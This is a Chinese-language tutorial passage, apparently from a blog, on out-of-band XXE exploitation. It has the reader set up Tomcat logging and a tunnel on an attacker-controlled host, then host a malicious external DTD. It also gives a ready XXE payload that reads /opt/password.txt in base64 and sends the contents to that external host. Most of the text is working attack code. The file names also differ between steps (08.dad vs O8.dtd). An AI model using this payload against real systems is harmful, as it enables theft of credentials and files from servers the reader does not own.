![](../Images/003d9d67a296a19684a9e6d7e4f95d85.png)

**\*接下来修改Tomcat下面的/conf/server.xml文件**

`<ValveclassName="org.apache.catalina.valves.AccessLogValve"directory="logs"prefix="localhost_access_log."suffix=".txt"pattern='%h %p %H %l %u %t "%r" params={%{post}r} %s %bbytes %Dms'/>`

**接下来修改Tomcat为你创建ngrok时的端口。（为了不防止和我的burp冲突那个）修改port后面的数字** 

`<Connectorport="8998"protocol="HTTP/1.1"connectionTimeout="20000"redirectPort="8443"/>`

**启动Tomcat目录下的/bin/Tomcat7.exe。**

**接下来在本机Tomcat目录下的webapps/ROOT里面写入一个08.dad文件，内容为：** `<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://jiuan.free.idcfengye.com/?%file;'>" > %all;`

**需要注意一下''里面的http://jiuan.free.idcfengye.com/ 需要换成你的，保存文件。****然后发送恶意XXE代码到目标下。**

<?xml version\="1.0"?><!DOCTYPE ANY \[ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///opt/password.txt"><!ENTITY % dtd SYSTEM "http://jiuan.free.idcfengye.com/O8.dtd">

%dtd;%send\]>

  

**php://filter/read=convert.base64-encode/resource=file:///opt/password.txt****这个里面跟着的是读取文件的路径。http://jiuan.free.idcfengye.com/O8.dtd****这个就是你的外网链接了，自行修改。然后抓包把这个恶意的XXE代码放进去**
